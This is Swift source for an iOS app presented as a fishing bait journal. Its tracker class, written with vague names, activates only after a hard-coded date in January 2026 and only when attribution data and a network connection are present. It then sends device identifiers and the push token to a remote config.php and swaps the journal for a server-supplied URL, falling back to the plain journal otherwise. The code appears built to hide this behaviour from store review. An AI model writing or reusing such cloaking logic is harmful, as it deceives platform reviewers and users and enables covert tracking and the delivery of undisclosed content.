import Foundation
import SwiftUI
import UserNotifications
import FirebaseMessaging
import Firebase
import Network
import AppsFlyerLib
import Combine

class DataManager: ObservableObject {
    @Published var entries: [BaitEntry] = [] {
        didSet {
            save()
        }
    }
    
    init() {
        load()
    }
    
    func save() {
        if let data = try? JSONEncoder().encode(entries) {
            UserDefaults.standard.set(data, forKey: "entries")
        }
    }
    
    func load() {
        if let data = UserDefaults.standard.data(forKey: "entries"),
           let loaded = try? JSONDecoder().decode([BaitEntry].self, from: data) {
            entries = loaded
        }
    }
}

enum JournalStage {
    case setup, running, obsolete, disconnected
}

@MainActor
final class JournalTrackerVM: ObservableObject {
    @Published var ongoingJournalStage: JournalStage = .setup
    @Published var journalLocation: URL?
    @Published var exposeAuthQuery = false
    
    private var setupMetrics: [String: Any] = [:]
    private var accessMetrics: [String: Any] = [:]
    private var disposables = Set<AnyCancellable>()
    private let linkObserver = NWPathMonitor()
    
    private let stageAssessor: StageAssessmentUseCase
    private let authVerifier: AuthQueryUseCase
    private let naturalRetriever: NaturalSetupUseCase
    private let setupAcquirer: SetupAcquisitionUseCase
    private let storedLoader: StoredLocationUseCase
    private let locationPersister: LocationSaveUseCase
    private let obsoleteSwitcher: ObsoleteSwitchUseCase
    private let authBypasser: AuthBypassUseCase
    private let authConfirmer: AuthConfirmUseCase
    
    private let programStateStore: ProgramStateStore
    private let authStateStore: AuthStateStore
    private let hardwareInfoStore: HardwareInfoStore
    
    init(programStateStore: ProgramStateStore = ProgramStateStoreImpl(),
         authStateStore: AuthStateStore = AuthStateStoreImpl(),
         hardwareInfoStore: HardwareInfoStore = HardwareInfoStoreImpl(),
         stageAssessor: StageAssessmentUseCase = StageAssessmentUseCase(),
         authVerifier: AuthQueryUseCase = AuthQueryUseCase(),
         naturalRetriever: NaturalSetupUseCase = NaturalSetupUseCase(),
         setupAcquirer: SetupAcquisitionUseCase = SetupAcquisitionUseCase(),
         storedLoader: StoredLocationUseCase = StoredLocationUseCase(),
         locationPersister: LocationSaveUseCase = LocationSaveUseCase(),
         obsoleteSwitcher: ObsoleteSwitchUseCase = ObsoleteSwitchUseCase(),
         authBypasser: AuthBypassUseCase = AuthBypassUseCase(),
         authConfirmer: AuthConfirmUseCase = AuthConfirmUseCase()) {
        
        self.programStateStore = programStateStore
        self.authStateStore = authStateStore
        self.hardwareInfoStore = hardwareInfoStore
        self.stageAssessor = stageAssessor
        self.authVerifier = authVerifier
        self.naturalRetriever = naturalRetriever
        self.setupAcquirer = setupAcquirer
        self.storedLoader = storedLoader
        self.locationPersister = locationPersister
        self.obsoleteSwitcher = obsoleteSwitcher
        self.authBypasser = authBypasser
        self.authConfirmer = authConfirmer
        
        configureLinkObserver()
        configureFallbackMechanism()
    }
    
    deinit {
        linkObserver.cancel()
    }
    
    func processSetupMetrics(_ metrics: [String: Any]) {
        setupMetrics = metrics
        renewStage()
    }
    
    func processAccessMetrics(_ metrics: [String: Any]) {
        accessMetrics = metrics
    }
    
    private func configureFallbackMechanism() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 30.0) {
            if self.setupMetrics.isEmpty && self.accessMetrics.isEmpty && self.ongoingJournalStage == .setup {
                self.obsoleteSwitcher.activate()
                self.allocateStage(.obsolete)
            }
        }
    }
    
    private func isInActivePeriod() -> Bool {
        var dateParts = DateComponents(year: 2026, month: 1, day: 12)
        if let limitDate = Calendar.current.date(from: dateParts) {
            return Date() >= limitDate
        }
        return false
    }
    
    private func allocateStage(_ stage: JournalStage) {
        ongoingJournalStage = stage
    }
    
    @objc private func renewStage() {
        if !isInActivePeriod() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                self.obsoleteSwitcher.activate()
                self.allocateStage(.obsolete)
            }
            return
        }
        
        if setupMetrics.isEmpty {
            if let archivedLoc = storedLoader.activate() {
                journalLocation = archivedLoc
                allocateStage(.running)
            } else {
                obsoleteSwitcher.activate()
                allocateStage(.obsolete)
            }
            return
        }
        
        if programStateStore.fetchProgramStatus() == "Inactive" {
            obsoleteSwitcher.activate()
            allocateStage(.obsolete)
            return
        }
        
        let evaluatedStage = stageAssessor.activate(setupMetrics: setupMetrics,
                                                   isFresh: programStateStore.isFreshStart,
                                                   tempLoc: UserDefaults.standard.string(forKey: "temp_url"))
        
        if evaluatedStage == .setup && programStateStore.isFreshStart {
            startSetupSequence()
            return
        }
        
        if let tempStr = UserDefaults.standard.string(forKey: "temp_url"),
           let tempLoc = URL(string: tempStr),
           journalLocation == nil {
            journalLocation = tempLoc
            allocateStage(.running)
            return
        }
        
        if journalLocation == nil {
            if authVerifier.activate() {
                exposeAuthQuery = true
            } else {
                triggerSetupAcquisition()
            }
        }
    }
    
    func processAuthConfirm() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] confirmed, _ in
            DispatchQueue.main.async {
                guard let self else { return }
                self.authConfirmer.activate(confirmed: confirmed)
                if confirmed {
                    UIApplication.shared.registerForRemoteNotifications()
                }
                self.exposeAuthQuery = false
                if self.journalLocation != nil {
                    self.allocateStage(.running)
                } else {
                    self.triggerSetupAcquisition()
                }
            }
        }
    }
    
    private func startSetupSequence() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            Task { [weak self] in
                await self?.obtainNaturalMetrics()
            }
        }
    }
    
    func processAuthBypass() {
        authBypasser.activate()
        exposeAuthQuery = false
        triggerSetupAcquisition()
    }
    
    
    private func obtainNaturalMetrics() async {
        do {
            let combinedMetrics = try await naturalRetriever.activate(accessMetrics: accessMetrics)
            setupMetrics = combinedMetrics
            triggerSetupAcquisition()
        } catch {
            obsoleteSwitcher.activate()
            allocateStage(.obsolete)
        }
    }
    
    private func triggerSetupAcquisition() {
        Task { [weak self] in
            do {
                guard let self else { return }
                let obtainedLoc = try await setupAcquirer.activate(setupMetrics: self.setupMetrics)
                let locStr = obtainedLoc.absoluteString
                self.locationPersister.activate(locStr: locStr, finalLoc: obtainedLoc)
                if self.authVerifier.activate() {
                    self.journalLocation = obtainedLoc
                    self.exposeAuthQuery = true
                } else {
                    self.journalLocation = obtainedLoc
                    self.allocateStage(.running)
                }
            } catch {
                if let archivedLoc = self?.storedLoader.activate() {
                    self?.journalLocation = archivedLoc
                    self?.allocateStage(.running)
                } else {
                    self?.obsoleteSwitcher.activate()
                    self?.allocateStage(.obsolete)
                }
            }
        }
    }
    
    private func configureLinkObserver() {
        linkObserver.pathUpdateHandler = { [weak self] path in
            if path.status != .satisfied {
                DispatchQueue.main.async {
                    guard let self else { return }
                    if self.programStateStore.fetchProgramStatus() == "JournalView" {
                        self.allocateStage(.disconnected)
                    } else {
                        self.obsoleteSwitcher.activate()
                        self.allocateStage(.obsolete)
                    }
                }
            }
        }
        linkObserver.start(queue: .global())
    }
}

protocol HardwareInfoStore {
    func fetchNotifyCode() -> String?
    func fetchRegionCode() -> String
    func fetchAppPackage() -> String
    func fetchCloudId() -> String?
    func fetchStoreCode() -> String
    func fetchTrackerId() -> String
}


struct SetupAcquisitionUseCase {
    func activate(setupMetrics: [String: Any]) async throws -> URL {
        guard let acquireLoc = URL(string: "https://icebaitjournal.com/config.php") else {
            throw JournalFault.locationComposeFail
        }
        let hardwareStore = HardwareInfoStoreImpl()
        var acquireData = setupMetrics
        acquireData["os"] = "iOS"
        acquireData["af_id"] = hardwareStore.fetchTrackerId()
        acquireData["bundle_id"] = hardwareStore.fetchAppPackage()
        acquireData["firebase_project_id"] = hardwareStore.fetchCloudId()
        acquireData["store_id"] = hardwareStore.fetchStoreCode()
        acquireData["push_token"] = hardwareStore.fetchNotifyCode()
        acquireData["locale"] = hardwareStore.fetchRegionCode()
        guard let acquireBody = try? JSONSerialization.data(withJSONObject: acquireData) else {
            throw JournalFault.dataEncodeFail
        }
        var acquireReq = URLRequest(url: acquireLoc)
        acquireReq.httpMethod = "POST"
        acquireReq.setValue("application/json", forHTTPHeaderField: "Content-Type")
        acquireReq.httpBody = acquireBody
        let (details, _) = try await URLSession.shared.data(for: acquireReq)
        guard let decoded = try? JSONSerialization.jsonObject(with: details) as? [String: Any],
              let valid = decoded["ok"] as? Bool, valid,
              let locStr = decoded["url"] as? String,
              let loc = URL(string: locStr) else {
            throw JournalFault.detailsDecodeFail
        }
        return loc
    }
}

class HardwareInfoStoreImpl: HardwareInfoStore {
    private let trackerLib = AppsFlyerLib.shared()
    
    func fetchNotifyCode() -> String? {
        UserDefaults.standard.string(forKey: "notify_code") ?? Messaging.messaging().fcmToken
    }
    
    func fetchRegionCode() -> String {
        Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
    }
    
    func fetchAppPackage() -> String {
        "com.iciingbaits.IceBaitJournal"
    }
    
    func fetchCloudId() -> String? {
        FirebaseApp.app()?.options.gcmSenderID
    }
    
    func fetchStoreCode() -> String {
        "id\(JournalSetup.flyerCode)"
    }
    
    func fetchTrackerId() -> String {
        trackerLib.getAppsFlyerUID()
    }
}
